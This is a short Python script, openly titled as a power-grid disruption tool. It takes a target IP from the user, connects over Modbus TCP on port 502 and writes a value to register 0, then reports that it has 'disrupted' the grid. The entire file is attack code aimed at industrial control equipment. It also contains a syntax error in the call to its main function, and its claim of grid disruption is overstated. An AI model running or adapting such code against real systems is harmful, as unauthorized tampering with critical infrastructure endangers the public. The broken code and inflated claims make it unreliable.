from pymodbus.client.sync import ModbusTcpClient as ModbusClient

def disrupt_power_grid(target):
    client = ModbusClient(target, port=502)
    try:
        client.connect()
        client.write_register(0, 1)
        print(f"Disrupted power grid at {target}")
    except Exception as e:
        print(f"Error: {e}")
    finally:
        client.close()

def main():
    target = input("Enter target IP: ")
    disrupt_power_grid(.target)

if __name__ == "__main__":
    main()
